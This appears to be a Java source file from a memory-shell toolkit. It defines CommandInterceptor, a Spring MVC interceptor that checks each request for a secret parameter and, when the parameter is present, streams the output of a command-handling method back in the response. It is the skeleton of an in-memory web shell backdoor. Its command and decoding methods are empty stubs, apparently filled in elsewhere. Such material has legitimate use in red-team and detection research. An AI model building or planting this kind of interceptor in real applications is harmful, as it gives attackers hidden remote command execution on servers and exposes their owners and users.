package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.servlet.AsyncHandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.InputStream;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class CommandInterceptor implements AsyncHandlerInterceptor {
    public static String paramName;

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            String param = getParam(request.getParameter(paramName));
            if (param != null) {
                InputStream inputStream = getInputStream(param);
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return false;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return true;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {

    }

    @Override
    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

    }
}
